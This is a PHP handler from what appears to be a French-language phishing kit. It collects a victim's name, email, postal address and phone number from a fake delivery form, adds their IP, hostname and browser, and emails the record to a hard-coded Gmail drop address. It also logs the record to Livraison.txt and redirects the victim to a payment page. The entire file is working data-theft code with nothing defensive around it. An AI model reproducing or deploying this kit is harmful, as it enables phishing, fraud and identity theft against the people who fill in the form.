<?php
$ip = $_SERVER["REMOTE_ADDR"];
$hostname = gethostbyaddr($ip);

$send = "oyyiigg@gmail.com";
$subject = "~ New Résultat By Y K K ~ | $ip";

header("Location: ../Pay.html");

$message = "|----------|By KaKarout|--------------|\n";
$message .= "-------------------- La Livraison -------------------\n";
$message .= "--------------  Infos -------------\n";
$message .= "Prénom      : " . $_POST['Prenom'] . "\n";
$message .= "Nom      : " . $_POST['Nom'] . "\n";
$message .= "Adresse Email      : " . $_POST['AdresseEmail'] . "\n";
$message .= "Adresse de la rue      : " . $_POST['Adresse'] . "\n";
$message .= "Adresse de la rue 2      : " . $_POST['Adresse2'] . "\n";
$message .= "Ville      : " . $_POST['Ville'] . "\n";
$message .= "State      : " . $_POST['State'] . "\n";
$message .= "Code Postal      : " . $_POST['CodePostal'] . "\n";
$message .= "Pays      : " . $_POST['Pays'] . "\n";
$message .= "Téléphone      : " . $_POST['Telephone'] . "\n";
$message .= "|---------------|Info|-------------------|\n";
$message .= "IP      : $ip\n";
$message .= "HOST    : $hostname\n";
$message .= "BROWSER : " . $_SERVER['HTTP_USER_AGENT'] . "\n";
$message .= "|----------|By KaKarout|--------------|\n";

mail($send, $subject, $message);

$file = fopen("./Livraison.txt", 'a');
fwrite($file, $message);
fclose($file);
?>